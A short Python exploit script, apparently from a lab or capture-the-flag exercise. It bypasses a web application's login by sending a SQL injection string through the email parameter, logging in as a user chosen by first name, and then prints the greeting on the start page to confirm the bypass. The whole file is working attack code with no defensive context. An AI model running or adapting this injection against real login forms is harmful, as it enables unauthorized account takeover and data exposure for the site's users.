#!/usr/bin/env python
import requests
import sys
import os
import logging
import re
from const import *
logging.basicConfig()
log = logging.getLogger(__file__)
log.setLevel(logging.DEBUG)

def login_user(email, pw):
  r = s.get(BASE_URL + "/login.html", params={ 'email' : email, 'password' : pw })
  if r.status_code != 200:
    log.error("error logging in user")
    return None

def exploit(first_name):
  login_user("x' OR first_name = '"+first_name+"';--", "")

def main():

  exploit('Hanni')

  r = s.get(BASE_URL + "/start.html")
  m = re.findall("<h2>Hello .*?</h2>", r.content)

  try:
    print(m[0])
  except:
    log.error("error, first name not found")

if __name__=="__main__":
  s = requests.session()
  main()
